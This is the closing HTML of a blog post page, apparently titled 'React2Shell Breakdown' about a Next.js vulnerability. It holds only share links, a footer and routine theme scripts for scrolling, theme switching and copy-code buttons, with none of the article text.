            href="https://telegram.me/share/url?text=How%20One%20HTTP%20Request%20Can%20Compromise%20Your%20Next.js%20App%20%e2%80%94%20React2Shell%20Breakdown&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2freact2shell%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=How%20One%20HTTP%20Request%20Can%20Compromise%20Your%20Next.js%20App%20%e2%80%94%20React2Shell%20Breakdown&u=http%3a%2f%2flocalhost%3a1313%2fposts%2freact2shell%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="http://localhost:1313/">Vyshak Haridasan</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
